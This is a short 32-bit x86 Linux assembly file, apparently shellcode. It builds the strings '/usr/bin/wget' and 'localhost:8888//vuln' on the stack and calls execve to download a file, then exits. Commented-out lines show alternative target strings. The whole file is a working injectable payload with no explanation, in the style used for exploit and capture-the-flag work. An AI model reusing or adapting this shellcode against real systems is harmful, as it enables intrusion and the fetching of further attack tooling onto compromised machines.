.text
.globl main
main:

push   $0xb
pop    %eax
cltd   
push   %edx
#push   $0x6e6c7576
#push   $0x2f2f3038
#push   $0x30383a32

push   $0x6e6c7576
push   $0x2f2f3838
push   $0x38383a74
push   $0x736f686c
push   $0x61636f6c

#push   $0x6d616574
mov    %esp,%ecx
push   %edx
push   $0x74
push   $0x6567772f
push   $0x6e69622f
push   $0x7273752f
mov    %esp,%ebx
push   %edx
push   %ecx
push   %ebx
mov    %esp,%ecx
int    $0x80
inc    %eax
int    $0x80
